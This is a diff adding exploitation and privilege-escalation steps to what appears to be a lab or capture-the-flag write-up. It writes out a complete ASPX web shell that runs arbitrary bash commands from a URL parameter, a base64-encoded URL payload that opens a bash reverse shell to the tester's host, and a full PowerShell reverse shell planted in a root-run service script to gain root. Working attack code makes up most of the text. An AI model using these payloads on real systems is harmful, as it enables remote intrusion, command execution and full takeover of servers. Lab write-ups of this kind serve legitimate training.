@@ -74,8 +74,80 @@ using the creds gotten to check if we have share access to the shares in smb. we
 
 login to download some file and uploaded a file into the share. 
 
+```asp
+<%@ Page Language="C#" %>
+<%@ Import Namespace="System.Diagnostics" %>
+
+<script runat="server">
+
+protected void Page_Load(object sender, EventArgs e)
+{
+    string cmd = Request["cmd"];
+    
+    if (!string.IsNullOrEmpty(cmd))
+    {
+        ExecuteCommand(cmd);
+    }
+}
+
+private void ExecuteCommand(string command)
+{
+    try
+    {
+        Process proc = new Process();
+        proc.StartInfo.FileName = "/bin/bash";
+        proc.StartInfo.Arguments = "-c \"" + command + "\"";
+        proc.StartInfo.RedirectStandardOutput = true;
+        proc.StartInfo.UseShellExecute = false;
+        proc.StartInfo.CreateNoWindow = true;
+        proc.Start();
+        
+        string output = proc.StandardOutput.ReadToEnd();
+        Response.Write(output);
+        proc.WaitForExit();
+    }
+    catch (Exception ex)
+    {
+        Response.Write("Error: " + ex.Message);
+    }
+}
+
+</script>
+```
+uploading an aspx webshell gotten from a friend. 
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/0fd4221b-98e5-4f82-83e4-6e0d46b88268)
+
+uploaded it. 
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/1555c4a2-eebd-474c-bfc3-d5c731d1cf23)
+
+navigating to the shell path `http://172.16.246.131:8080/pwned.aspx?cmd=id`, we triggered RCE. 
+
+```
+http://172.16.246.131:8080/pwned.aspx?cmd=echo%20%22L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE3Mi4xNi4yNDYuMS84MCAwPiYx%22%20|%20base64%20-d%20|%20bash
+```
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/e6f41763-6dd4-45f7-9a51-0d65d2e86653)
+
+Using the payload above, we spawned a reverse shell.
 
 
 
+## Privilege Escalation
 
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/57dba1c1-2f33-40bd-b3af-6d45b2e960f7)
+
+running pspy, we can see a powershell script running as root. 
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/a2ec49df-1d98-479f-a594-1196168e6725)
+
+```ps
+$LHOST = "172.16.246.1"; $LPORT = 80; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
+```
+modified the `service.ps1` script, and wait for 1 min 
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/a18829d5-c074-47f5-98df-d78a1fa87217)
+
+got a reverse shell as `root`.
 
